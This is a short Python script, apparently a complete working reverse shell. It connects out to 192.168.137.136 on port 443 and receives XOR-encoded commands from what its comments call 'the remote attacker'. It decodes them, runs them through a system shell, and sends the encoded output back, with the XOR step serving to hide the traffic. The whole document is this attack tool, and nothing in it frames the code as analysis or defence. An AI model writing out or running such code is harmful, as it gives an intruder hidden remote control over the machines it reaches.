#!/usr/bin/python

import socket, subprocess

RHOST = "192.168.137.136"
RPORT = 443
s = socket.socket()
s.connect((RHOST, RPORT))

while True:
    # Receive XOR encoded data from network socket
    # XOR the data again with a '\x41' (an A hex) to get back normal data
    data = s.recv(1024)
    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] ^= 0x41

    # Execute the decoded data as a command. The subprocess module is great because we can PIPE STDIN/STDOUT/STDERR to a variable
    comm = subprocess.Popen(str(en_data), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()

    # Encode the output and send to the remote attacker
    en_STDOUT = bytearray(STDOUT)
    for i in range(len(en_STDOUT)):
        en_STDOUT[i] ^= 0x41
    s.send(en_STDOUT)

s.close()
